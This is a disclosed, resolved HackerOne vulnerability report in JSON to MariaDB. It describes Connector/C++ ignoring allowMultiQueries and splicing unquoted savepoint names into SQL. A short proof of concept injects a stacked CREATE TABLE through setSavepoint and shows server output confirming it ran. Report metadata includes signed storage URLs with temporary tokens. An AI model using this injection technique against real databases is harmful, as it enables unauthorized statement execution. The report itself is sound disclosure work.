@@ -1,0 +1,161 @@
+{
+  "id": 3890329,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODkwMzI5",
+  "url": "https://hackerone.com/reports/3890329",
+  "title": "Connector/C++ ignores allowMultiQueries and injects savepoint names into SQL",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-07-26T00:59:38.148Z",
+  "submitted_at": "2026-07-26T00:59:38.640Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "fg0x0",
+    "url": "/fg0x0",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/we9mo7ui49vl91bznzyid2bvt1lf/33193aed4df168c753cb4b15e6d5d8d6ba053ba5ee3e8d1478c137162601abe9"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8724,
+    "url": "https://hackerone.com/mariadb",
+    "handle": "mariadb",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/dd1dfc8fc7352772e4a8994c07e1d628d34edc74db48377c707f10829dc23d53",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/2a499a0b732abf809ef45635d9ad400431480fafd17452e700cbdba6fd64fe85"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MariaDB",
+      "twitter_handle": "mariadb_org",
+      "website": "https://mariadb.org",
+      "about": "MariaDB is a high performance, open source database that helps the world's busiest websites deliver more content, faster."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-11-04T11:40:48.361Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-11-04T11:40:48.016Z",
+  "team_member_agreed_on_going_public_at": "2026-11-04T11:23:16.435Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Two independent defects in statement building. ConnectProtocol::createConnection passes the literal CLIENT_MULTI_STATEMENTS to mysql_real_connect and throws away the capability mask it just computed, so stacked statements are accepted on every connection even though allowMultiQueries defaults to false and the code contains an explicit gate for it. Separately, Connection::setSavepoint and Connection::releaseSavepoint concatenate the application-supplied savepoint name into SQL with no quoting or validation at all. Together they turn a savepoint name into arbitrary statement execution.\n\n## Details\n\ninitializeClientCapabilities computes the client flags correctly at src/protocol/capi/ConnectProtocol.cpp:183:\n\n```cpp\n    if (options->allowMultiQueries || (options->rewriteBatchedStatements)){\n      capabilities|= MariaDbServerCapabilities::MULTI_STATEMENTS;\n    }\n```\n\nThat mask is then never handed to the connect call. At :474 the flag argument is a literal:\n\n```cpp\n    if (mysql_real_connect(connection, NULL, NULL, NULL, NULL, 0, NULL, CLIENT_MULTI_STATEMENTS) == nullptr)\n```\n\nThe computed capabilities value is passed only to sslWrapper and to authenticationHandler, whose signature ignores it (:590 takes int64_t /*clientCapabilities*/). So the only client flag that reaches libmariadb is the hardcoded one. allowMultiQueries defaults to false (src/options/Options.h:71, src/options/DefaultOptions.cpp), which means an application that deliberately leaves multi-statement support off, or explicitly sets it off, still gets it.\n\nThe savepoint path has no escaping. src/MariaDbConnection.cpp:1093-1099:\n\n```cpp\n  Savepoint* MariaDbConnection::setSavepoint(const SQLString& name)\n  {\n    Savepoint* savepoint= new MariaDbSavepoint(name, savepointCount++);\n    std::unique_ptr<Statement> st(createStatement());\n\n    st->execute(\"SAVEPOINT \"+savepoint->toString());\n```\n\nand :1113-1116:\n\n```cpp\n  void MariaDbConnection::releaseSavepoint(const Savepoint* savepoint)\n  {\n    std::unique_ptr<Statement> st(createStatement());\n    st->execute(\"RELEASE SAVEPOINT \" + savepoint->toString());\n```\n\nMariaDbSavepoint::toString (src/MariaDbSavepoint.cpp:54-58) simply appends the numeric id to the caller's name. name arrives from the public API sql::Connection::setSavepoint(const SQLString&). The driver has a quoteIdentifier helper at MariaDbConnection.cpp:85-87, and it is not used here. Connector/J backtick-quotes savepoint names.\n\nNote that quoteIdentifier would not have been sufficient anyway: it is built on the same sql::mariadb::replace whose cursor bug is the subject of the companion report, so it emits an odd run of backticks and does not reliably quote either.\n\n## PoC\n\n1. Connect to a stock MariaDB 11.4 with allowMultiQueries explicitly set to false, which is also the default:\n\n```cpp\n  sql::Properties props({{\"user\",\"root\"},{\"password\",\"pocpw\"}});\n  props[\"allowMultiQueries\"] = \"false\";\n```\n\n2. Execute a stacked statement. The application asked for multi-statement support to be off:\n\n```bash\n=== F3a: stacked statement with allowMultiQueries=false ===\n    server accepted the stacked statement\n    canary_a exists = YES  <== multi-statement is ON\n```\n\n3. Call setSavepoint with a name containing SQL:\n\n```cpp\n  conn->setSavepoint(\"sp; CREATE TABLE pocdb.canary_b (id INT); -- \");\n```\n\n4. The server general log shows the exact statement the driver sent:\n\n```bash\nSAVEPOINT sp; CREATE TABLE pocdb.canary_b (id INT); -- 0\n```\n\n5. The DDL ran:\n\n```bash\n=== F3b: injection through Connection::setSavepoint(name) ===\n    setSavepoint() returned normally\n    canary_b exists = YES  <== DDL executed via savepoint name\n```\n\n   Confirmed independently on the server:\n\n```bash\nTables_in_pocdb\nalpha\ncanary_a\ncanary_b\ncanary_c\nzsecret\n```\n\n6. Negative control: with a plain savepoint name the emitted statement is a normal SAVEPOINT and no extra table appears.\n\nScenario A (sanity): \nplain savepoint name -> a normal SAVEPOINT statement, no extra table created Scenario B (negative control):\nallowMultiQueries explicitly set to false, which is also the default Scenario C (attack):\nstacked statement accepted (canary_a created) and setSavepoint(\"sp; CREATE TABLE ...; -- \") emitted that exact pair (canary_b created)\n\nArtifacts:\n- poc/poc_evidence.txt\n- poc/poc_chain.cpp, poc/poc_chain2.cpp\n- Affected: src/protocol/capi/ConnectProtocol.cpp:474 and :183,\n  src/MariaDbConnection.cpp:1097 and :1115, src/MariaDbSavepoint.cpp:54-58, at HEAD c57f17f\n\nPreconditions. For the savepoint issue the application must pass an untrusted string as a savepoint name; frameworks that name nested transactions after user-visible labels, tenant identifiers or request identifiers match that shape. The multi-statement issue has no precondition at all: it applies to every connection the driver makes.\n\n## Impact\n\nThe always-on multi-statement defect is CWE-1188 Insecure Default Initialization and is best treated as a severity amplifier: on its own it does not grant access, but it removes the single most effective containment for every injection bug in or above the driver.\n\nRealized on a running server: arbitrary DDL executed from a savepoint name, with the created table confirmed present afterwards.\n\nThe multi-statement defect matters beyond savepoints. Any SQL injection an application has, including the metadata escaping bug reported separately, is upgraded from single-statement manipulation to arbitrary statement execution because the driver silently supplies the stacking capability. An application that audited its configuration and set allowMultiQueries=false has no way to tell from the outside that the setting does nothing.",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 6323718,
+      "file_name": "poc_chain.cpp",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/p5oa1ldix5otbw6vmdwgioqbswsl?response-content-disposition=attachment%3B%20filename%3D%22poc_chain.cpp%22%3B%20filename%2A%3DUTF-8%27%27poc_chain.cpp&response-content-type=text%2Fx-c%2B%2Bsrc&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3JJUD3AU%2F20261104%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261104T164501Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDerOyiLWMO6F94e%2FBWFejmdJtr7q7jEylSsAfuZLctLwIhAI61F9JIKwq%2BONo5xqYlJStksaxykljdfjz1cds7Eg%2BBKrsFCK7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxGktBS4Q8uk0cEPAQqjwWoFn43IhUGDDY6RlvrFz7reJjbvszKepl4xzGiXfHDUR9J%2B3T3aYiwk6f83cOyGTpT%2F9u3PrjjoPCrwPuFqySAzHigqIOV%2BeN%2FVX7mevq5Yzb3K4u%2Bdz1bLmYB1wFzXatt0ALLzWx7%2BJNsZRP6LUtas%2BAW0H5Ckcxk%2FPV5AwlJ5qyAhUKnp2NbrMhUxc%2FEU0XROjEP81RFnkzfxpoPUvlMMd4IsWtMx4xTTSE%2BJO8jHcHH24ruTimxv0FohGUqgKZglHKqzrDwj9WJeF04UlkqkTfnctg1F%2Fh8BYivJR6VkKbcFblj8NW3%2Be0c%2FOixSKoUMeAlg49mmUfdBxT3gEAwalfVZM07QOj%2FAiSMIrvJS8cxy3ILOwHMP%2FsCawg8lWcABU5UV3SnLPm0zyE2N9NKDeWm%2BWfwg9UvDyRIDbzWhpZ3FsFqJVTkQu8wPg17LzBJkuR3ZDZvWrySz9OsrqNz74y5H7YKaaUpPfAXGbZm0YDc%2Bini4v4JtVu%2FsBssiIHD4o5qjXDIzRRBqKA%2FxwzhEKHJ%2Bw5i2DJkpywlbsXo3blwgXEZhihkyYXZjMF1bDqwrUDJqAE5QzKI4PeVqH%2BONmo0kNslmASQb3vw7lOgjgqLj5vEqzJQ%2BzEfdJuEPVOcz2Ap6HEGesGrik%2Bv5Qg87PTfpi3FEsspW7mlZStAYI7udn7ptiCn43OeCDDLRlLuv%2BJrMxBgd8SI407bFo604j9WD0oShFBJCM9oUEMW4e07dhLTyXMQ59JENPHk10yh%2Bt4S3nzgugUUCEVjqjTFaDVYorrv01NbfKgteUABVjx8KWb%2BEvpPqPjo3RRNee71LTa2TEC40gjOjNwXxt6Krsn2jzoI%2FqzdtpP4c3VLMIHRrNcGOrABJ%2F6mC%2BPao%2BmnQoMDA2HQamKGUQkUtENwiZDIIrxz4129L1GMWZQhCv8yfF1LWPRfiL0KAI8RU0qg5O8YMDihfxi3ylcQpya8WkPcMFqfNBfDSdno3QStvO1zbDF9miSOoBfHH15D20Cvt4pYa68R6069Z%2Bu82L8Ck1UWX%2F53zQyxovzzbki3qKXeaQ5YUor4PDK9ePlrP12rSLtJXsE%2F5Lbm3eK%2Fw0ZoHb0Vj%2B1QPJ4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=57ce3f3db30c7b8a9efbd2c49158db37308d35cb402b2a4928e229215d88c477",
+      "file_size": 3298,
+      "type": "text/x-c++src",
+      "moderated": null
+    },
+    {
+      "id": 6323719,
+      "file_name": "poc_chain2.cpp",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/sn7641p43ydoto5elt53r6dkziuz?response-content-disposition=attachment%3B%20filename%3D%22poc_chain2.cpp%22%3B%20filename%2A%3DUTF-8%27%27poc_chain2.cpp&response-content-type=text%2Fx-c%2B%2Bsrc&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3JJUD3AU%2F20261104%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261104T164501Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDerOyiLWMO6F94e%2FBWFejmdJtr7q7jEylSsAfuZLctLwIhAI61F9JIKwq%2BONo5xqYlJStksaxykljdfjz1cds7Eg%2BBKrsFCK7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxGktBS4Q8uk0cEPAQqjwWoFn43IhUGDDY6RlvrFz7reJjbvszKepl4xzGiXfHDUR9J%2B3T3aYiwk6f83cOyGTpT%2F9u3PrjjoPCrwPuFqySAzHigqIOV%2BeN%2FVX7mevq5Yzb3K4u%2Bdz1bLmYB1wFzXatt0ALLzWx7%2BJNsZRP6LUtas%2BAW0H5Ckcxk%2FPV5AwlJ5qyAhUKnp2NbrMhUxc%2FEU0XROjEP81RFnkzfxpoPUvlMMd4IsWtMx4xTTSE%2BJO8jHcHH24ruTimxv0FohGUqgKZglHKqzrDwj9WJeF04UlkqkTfnctg1F%2Fh8BYivJR6VkKbcFblj8NW3%2Be0c%2FOixSKoUMeAlg49mmUfdBxT3gEAwalfVZM07QOj%2FAiSMIrvJS8cxy3ILOwHMP%2FsCawg8lWcABU5UV3SnLPm0zyE2N9NKDeWm%2BWfwg9UvDyRIDbzWhpZ3FsFqJVTkQu8wPg17LzBJkuR3ZDZvWrySz9OsrqNz74y5H7YKaaUpPfAXGbZm0YDc%2Bini4v4JtVu%2FsBssiIHD4o5qjXDIzRRBqKA%2FxwzhEKHJ%2Bw5i2DJkpywlbsXo3blwgXEZhihkyYXZjMF1bDqwrUDJqAE5QzKI4PeVqH%2BONmo0kNslmASQb3vw7lOgjgqLj5vEqzJQ%2BzEfdJuEPVOcz2Ap6HEGesGrik%2Bv5Qg87PTfpi3FEsspW7mlZStAYI7udn7ptiCn43OeCDDLRlLuv%2BJrMxBgd8SI407bFo604j9WD0oShFBJCM9oUEMW4e07dhLTyXMQ59JENPHk10yh%2Bt4S3nzgugUUCEVjqjTFaDVYorrv01NbfKgteUABVjx8KWb%2BEvpPqPjo3RRNee71LTa2TEC40gjOjNwXxt6Krsn2jzoI%2FqzdtpP4c3VLMIHRrNcGOrABJ%2F6mC%2BPao%2BmnQoMDA2HQamKGUQkUtENwiZDIIrxz4129L1GMWZQhCv8yfF1LWPRfiL0KAI8RU0qg5O8YMDihfxi3ylcQpya8WkPcMFqfNBfDSdno3QStvO1zbDF9miSOoBfHH15D20Cvt4pYa68R6069Z%2Bu82L8Ck1UWX%2F53zQyxovzzbki3qKXeaQ5YUor4PDK9ePlrP12rSLtJXsE%2F5Lbm3eK%2Fw0ZoHb0Vj%2B1QPJ4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=cecc94f84d5dd354701bdc2145a0b991f976fd91fda54d0bb517ee7bd70d6113",
+      "file_size": 2044,
+      "type": "text/x-c++src",
+      "moderated": null
+    },
+    {
+      "id": 6323720,
+      "file_name": "run_poc.sh",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/75spu5fcf17fopj39xztf9lvsm30?response-content-disposition=attachment%3B%20filename%3D%22run_poc.sh%22%3B%20filename%2A%3DUTF-8%27%27run_poc.sh&response-content-type=application%2Fx-sh&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3JJUD3AU%2F20261104%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261104T164501Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDerOyiLWMO6F94e%2FBWFejmdJtr7q7jEylSsAfuZLctLwIhAI61F9JIKwq%2BONo5xqYlJStksaxykljdfjz1cds7Eg%2BBKrsFCK7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxGktBS4Q8uk0cEPAQqjwWoFn43IhUGDDY6RlvrFz7reJjbvszKepl4xzGiXfHDUR9J%2B3T3aYiwk6f83cOyGTpT%2F9u3PrjjoPCrwPuFqySAzHigqIOV%2BeN%2FVX7mevq5Yzb3K4u%2Bdz1bLmYB1wFzXatt0ALLzWx7%2BJNsZRP6LUtas%2BAW0H5Ckcxk%2FPV5AwlJ5qyAhUKnp2NbrMhUxc%2FEU0XROjEP81RFnkzfxpoPUvlMMd4IsWtMx4xTTSE%2BJO8jHcHH24ruTimxv0FohGUqgKZglHKqzrDwj9WJeF04UlkqkTfnctg1F%2Fh8BYivJR6VkKbcFblj8NW3%2Be0c%2FOixSKoUMeAlg49mmUfdBxT3gEAwalfVZM07QOj%2FAiSMIrvJS8cxy3ILOwHMP%2FsCawg8lWcABU5UV3SnLPm0zyE2N9NKDeWm%2BWfwg9UvDyRIDbzWhpZ3FsFqJVTkQu8wPg17LzBJkuR3ZDZvWrySz9OsrqNz74y5H7YKaaUpPfAXGbZm0YDc%2Bini4v4JtVu%2FsBssiIHD4o5qjXDIzRRBqKA%2FxwzhEKHJ%2Bw5i2DJkpywlbsXo3blwgXEZhihkyYXZjMF1bDqwrUDJqAE5QzKI4PeVqH%2BONmo0kNslmASQb3vw7lOgjgqLj5vEqzJQ%2BzEfdJuEPVOcz2Ap6HEGesGrik%2Bv5Qg87PTfpi3FEsspW7mlZStAYI7udn7ptiCn43OeCDDLRlLuv%2BJrMxBgd8SI407bFo604j9WD0oShFBJCM9oUEMW4e07dhLTyXMQ59JENPHk10yh%2Bt4S3nzgugUUCEVjqjTFaDVYorrv01NbfKgteUABVjx8KWb%2BEvpPqPjo3RRNee71LTa2TEC40gjOjNwXxt6Krsn2jzoI%2FqzdtpP4c3VLMIHRrNcGOrABJ%2F6mC%2BPao%2BmnQoMDA2HQamKGUQkUtENwiZDIIrxz4129L1GMWZQhCv8yfF1LWPRfiL0KAI8RU0qg5O8YMDihfxi3ylcQpya8WkPcMFqfNBfDSdno3QStvO1zbDF9miSOoBfHH15D20Cvt4pYa68R6069Z%2Bu82L8Ck1UWX%2F53zQyxovzzbki3qKXeaQ5YUor4PDK9ePlrP12rSLtJXsE%2F5Lbm3eK%2Fw0ZoHb0Vj%2B1QPJ4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=cb653fb99f3a253b47576de5b9ae09dcef81830949fd45ef69702716aed19a92",
+      "file_size": 8889,
+      "type": "application/x-sh",
+      "moderated": null
+    },
+    {
+      "id": 6323721,
+      "file_name": "poc_evidence.txt",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/qodqa57vivbpxd3oe0t2bnhgfjlm?response-content-disposition=attachment%3B%20filename%3D%22poc_evidence.txt%22%3B%20filename%2A%3DUTF-8%27%27poc_evidence.txt&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3JJUD3AU%2F20261104%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261104T164501Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDerOyiLWMO6F94e%2FBWFejmdJtr7q7jEylSsAfuZLctLwIhAI61F9JIKwq%2BONo5xqYlJStksaxykljdfjz1cds7Eg%2BBKrsFCK7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxGktBS4Q8uk0cEPAQqjwWoFn43IhUGDDY6RlvrFz7reJjbvszKepl4xzGiXfHDUR9J%2B3T3aYiwk6f83cOyGTpT%2F9u3PrjjoPCrwPuFqySAzHigqIOV%2BeN%2FVX7mevq5Yzb3K4u%2Bdz1bLmYB1wFzXatt0ALLzWx7%2BJNsZRP6LUtas%2BAW0H5Ckcxk%2FPV5AwlJ5qyAhUKnp2NbrMhUxc%2FEU0XROjEP81RFnkzfxpoPUvlMMd4IsWtMx4xTTSE%2BJO8jHcHH24ruTimxv0FohGUqgKZglHKqzrDwj9WJeF04UlkqkTfnctg1F%2Fh8BYivJR6VkKbcFblj8NW3%2Be0c%2FOixSKoUMeAlg49mmUfdBxT3gEAwalfVZM07QOj%2FAiSMIrvJS8cxy3ILOwHMP%2FsCawg8lWcABU5UV3SnLPm0zyE2N9NKDeWm%2BWfwg9UvDyRIDbzWhpZ3FsFqJVTkQu8wPg17LzBJkuR3ZDZvWrySz9OsrqNz74y5H7YKaaUpPfAXGbZm0YDc%2Bini4v4JtVu%2FsBssiIHD4o5qjXDIzRRBqKA%2FxwzhEKHJ%2Bw5i2DJkpywlbsXo3blwgXEZhihkyYXZjMF1bDqwrUDJqAE5QzKI4PeVqH%2BONmo0kNslmASQb3vw7lOgjgqLj5vEqzJQ%2BzEfdJuEPVOcz2Ap6HEGesGrik%2Bv5Qg87PTfpi3FEsspW7mlZStAYI7udn7ptiCn43OeCDDLRlLuv%2BJrMxBgd8SI407bFo604j9WD0oShFBJCM9oUEMW4e07dhLTyXMQ59JENPHk10yh%2Bt4S3nzgugUUCEVjqjTFaDVYorrv01NbfKgteUABVjx8KWb%2BEvpPqPjo3RRNee71LTa2TEC40gjOjNwXxt6Krsn2jzoI%2FqzdtpP4c3VLMIHRrNcGOrABJ%2F6mC%2BPao%2BmnQoMDA2HQamKGUQkUtENwiZDIIrxz4129L1GMWZQhCv8yfF1LWPRfiL0KAI8RU0qg5O8YMDihfxi3ylcQpya8WkPcMFqfNBfDSdno3QStvO1zbDF9miSOoBfHH15D20Cvt4pYa68R6069Z%2Bu82L8Ck1UWX%2F53zQyxovzzbki3qKXeaQ5YUor4PDK9ePlrP12rSLtJXsE%2F5Lbm3eK%2Fw0ZoHb0Vj%2B1QPJ4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6e74df5f01b038b82466d3a556ce3d6b5a0d196ffe25f23686a25e7994377f72",
+      "file_size": 10182,
+      "type": "text/plain",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-12-04T11:23:16.904Z",
+  "allow_singular_disclosure_after": 2572695.160635243,
+  "singular_disclosure_allowed": false,
+  "vote_count": 2,
+  "voters": [
+    "fg0x0",
+    "nikkelm"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.9,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 10336,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "MariaDB Server & Connectors - Data corruption, exfiltration, disclosure",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": [],
+    "can_view_ave_report?": false
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
